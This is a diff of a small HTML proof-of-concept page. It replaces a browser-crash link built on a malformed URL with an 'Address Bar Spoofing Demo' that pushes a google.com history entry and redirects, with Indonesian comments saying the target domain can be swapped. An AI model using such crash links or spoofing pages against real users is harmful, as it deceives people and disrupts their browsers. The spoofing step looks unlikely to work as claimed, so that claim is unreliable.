@@ -1,16 +1,20 @@
-<!DOCTYPE HTML>
-<html lang="en-US">
-	<head>
-		<meta charset="UTF-8">
-		<meta name="viewport" content="width=device-width, user-scalable=no">
-		<title>Crash</title>
-	</head>
-	<body>
-	   <center>
-			<br>
-			<h1>
-				<a href="o.o:@xyz::://xyz" target="win">Click here to open a bugged tab and then send the URL to your device</a>
-			</h1>
-		</center>
-	</body>
-</html>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Address Bar Spoofing Demo</title>
+    <script>
+      // Langsung eksekusi setelah page load
+      window.onload = () => {
+        // Langkah 1: Tambahkan riwayat palsu ke google.com
+        history.pushState({}, '', 'https://www.google.com');
+
+        // Langkah 2: Redirect ke google.com (atau bisa diganti ke domain target lain)
+        setTimeout(() => {
+          location.href = "https://www.google.com";
+        }, 1000);
+      };
+    </script>
+  </head>
+  <body>
+    <h1>Redirecting to Google...</h1>
+  </body>
